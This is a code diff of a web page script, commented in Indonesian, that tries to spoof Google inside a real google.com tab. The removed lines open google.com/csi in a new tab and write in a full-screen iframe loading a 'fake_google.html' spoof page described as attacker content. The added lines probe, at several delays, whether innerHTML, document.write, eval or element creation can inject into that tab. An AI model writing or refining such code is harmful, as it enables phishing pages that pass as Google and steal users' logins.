@@ -5,30 +5,42 @@
 
 <script>
 function a() {
-  // Step 1 - Buka tab baru ke google.com/csi
   const tab = window.open(
     "https://www.google.com/csi", "_blank"
   );
   
   if (!tab) { alert("Blocked!"); return; }
 
-  // Step 2 - Di tab baru, inject iframe
-  // yang load konten dari attacker
-  setTimeout(() => {
-    try {
-      tab.document.write(`
-        <script>
-          const iframe = document.createElement('iframe');
-          iframe.style.cssText = 'position:fixed;inset:0;width:100%;height:100%;border:none;z-index:9999;';
-          iframe.src = 'https://raihanyasa2.github.io/spoof/fake_google.html';
-          document.body.appendChild(iframe);
-        <\/script>
-      `);
-      tab.document.close();
-    } catch(e) {
-      console.warn('Failed:', e.message);
-    }
-  }, 50);
+  [0, 50, 200, 500, 1000].forEach(delay => {
+    setTimeout(() => {
+      
+      // Cara 1 - innerHTML
+      try {
+        tab.document.body.innerHTML = '<h1>test</h1>';
+        alert('innerHTML OK at ' + delay + 'ms');
+      } catch(e) {}
+
+      // Cara 2 - document.write
+      try {
+        tab.document.write('<h1>test</h1>');
+        alert('write OK at ' + delay + 'ms');
+      } catch(e) {}
+
+      // Cara 3 - eval
+      try {
+        tab.eval('alert("eval OK at ' + delay + 'ms")');
+      } catch(e) {}
+
+      // Cara 4 - createElement
+      try {
+        const el = tab.document.createElement('h1');
+        el.textContent = 'test';
+        tab.document.body.appendChild(el);
+        alert('createElement OK at ' + delay + 'ms');
+      } catch(e) {}
+
+    }, delay);
+  });
 }
 </script>
 </body>
